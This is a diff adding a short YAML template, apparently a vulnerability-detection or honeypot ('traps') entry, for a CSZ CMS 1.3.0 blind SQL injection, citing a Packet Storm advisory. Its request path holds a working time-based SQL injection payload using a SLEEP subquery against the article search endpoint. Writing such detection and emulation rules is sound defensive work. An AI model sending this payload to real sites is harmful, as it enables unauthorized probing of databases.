@@ -1,0 +1,25 @@
+id: csz-cms-sqli
+info:
+  name: CSZ CMS 1.3.0 - SQL Injection
+  author: r3Y3r53
+  description: 'CSZ CMS version 1.3.0 suffers from multiple remote blind SQL injection
+    vulnerabilities.
+
+    '
+  severity: high
+  reference:
+  - https://packetstormsecurity.com/files/167028/CSZ-CMS-1.3.0-SQL-Injection.html
+  metadata:
+    verified: true
+    max-request: 1
+  tags: packetstorm,sqli,csz,cms
+traps:
+- request:
+    method: GET
+    path: /csz-cms/plugin/article/search?p=3D1%27%22)%20AND%20(SELECT%203910%20FROM%20(SELECT(SLEEP(6)))qIap)--%20ogLS
+    headers: {}
+    body: ''
+  response:
+    status_code: 200
+    headers: {}
+    body: CSZ CMS
